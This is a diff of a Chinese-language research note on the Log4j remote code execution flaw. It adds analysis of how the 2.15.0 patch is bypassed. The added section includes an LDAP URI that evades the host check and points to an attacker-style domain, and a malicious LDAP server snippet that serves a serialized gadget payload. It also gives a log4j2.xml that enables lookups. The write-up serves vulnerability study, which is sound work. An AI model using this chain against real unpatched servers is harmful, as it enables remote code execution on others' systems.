@@ -1,4 +1,4 @@
-log4j rce
+# log4j rce
 
 影响版本：
 
@@ -169,7 +169,7 @@ public static void main(String[] args) {
 
 ![image-20211211160626836](./images/image-20211211160626836.png)
 
-## 其他
+## 信息泄露
 
 今天看到其他师傅发的利用，意识到能用lookup信息泄露，比如
 
@@ -202,6 +202,84 @@ JavaLookup#lookup局限这几个
 但是strLookupMap中没有bundle这个key，应该不能直接触发，除非开发人员直接使用并且参数可控
 
 `ResourceBundle.getBundle(bundleName).getString(bundleKey)`
+
+## 2.15.0 更新
+
+今天看[4rain师傅发的文章](https://xz.aliyun.com/t/10689)，又学到一波
+
+2.16.0的补丁是直接删了LookupMessagePatternConverter，所以即使配置lookups也已经不存在调用jndilookup了
+
+![image-20211221160025073](log4j_RCE.assets/image-20211221160025073.png)
+
+而2.17.0补丁在lookup这里改了if里的部分代码，只允许java协议的lookup
+
+![image-20211221144822077](log4j_RCE.assets/image-20211221144822077.png)
+
+问题出在2.15.0的`uri.getHost()`，利用方式文章里写的很清楚，比如
+
+```java
+URI uri3 = new URI("ldap://127.0.0.1#.4ra1n.love:1389/badClassName");
+System.out.println(uri3.getHost());
+//得到 127.0.0.1绕过host检测
+```
+
+但是在底层得到的host仍为`127.0.0.1#.4ra1n.love`，配合泛域名解析就可以变成攻击者ip
+
+但是这个`#`貌似只有在MacOS上才不会报错..
+
+此时已经绕过了host限制，下面的限制满足一个即可绕过
+
+1. javaSerializedData不为空且javaClassName在白名单中
+2. javaReferenceAddress和javaFactory都为空
+
+![image-20211221163439414](log4j_RCE.assets/image-20211221163439414.png)
+
+第二个限制不允许远程加载对象和远程工厂，那就用第一个，结合ldap绕高版本jndi的方式(需要本地gadget)
+
+https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html
+
+在ldap server里的sendResult加上：
+
+```java
+protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ){
+            e.addAttribute("javaClassName", "java.lang.Byte");
+            try {
+                e.addAttribute("javaSerializedData",payload); //payload为本地利用链的gadget
+            } catch (ParseException  e1) {
+                e1.printStackTrace();
+            }
+            result.sendSearchEntry(e);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+}
+```
+
+然后需要配置日志输出格式为lookups即可
+
+log4j2.xml
+
+```xml
+<configuration status="OFF" monitorInterval="30">
+    <appenders>
+        <console name="CONSOLE-APPENDER" target="SYSTEM_OUT">
+            <PatternLayout pattern="%m{lookups}%n"/>
+        </console>
+    </appenders>
+
+    <loggers>
+        <root level="error">
+            <appender-ref ref="CONSOLE-APPENDER"/>
+        </root>
+    </loggers>
+</configuration>
+```
+
+
+
+
+
+
+
+
 
 参考：
 
